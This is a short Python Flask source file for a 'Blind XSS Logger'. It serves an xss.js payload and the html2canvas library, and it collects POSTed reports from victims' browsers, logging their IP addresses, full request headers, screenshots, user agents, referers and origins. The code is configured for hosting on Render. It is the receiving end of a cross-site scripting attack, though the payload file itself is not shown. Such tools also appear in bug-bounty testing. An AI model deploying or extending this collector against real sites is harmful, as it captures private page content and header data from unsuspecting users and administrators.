import os
from flask import Flask, request, jsonify, send_from_directory
import datetime

app = Flask(__name__, static_url_path='/static')

logs = []

@app.route('/')
def home():
    return "Blind XSS Logger Active"

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    log_entry = {
        'time': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'headers': dict(request.headers),
        'screenshot': data.get('screenshot'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'origin': request.headers.get('Origin')
    }
    logs.append(log_entry)
    print(f"New log: {log_entry}")
    return jsonify({"status": "ok"}), 200

@app.route('/xss.js')
def serve_xss():
    return send_from_directory('static', 'xss.js')

@app.route('/html2canvas.min.js')
def serve_html2canvas():
    return send_from_directory('static', 'html2canvas.min.js')

if __name__ == '__main__':
    # Required for Render
    port = int(os.environ.get('PORT', 10000))  # default to 10000 locally
    app.run(host='0.0.0.0', port=port)
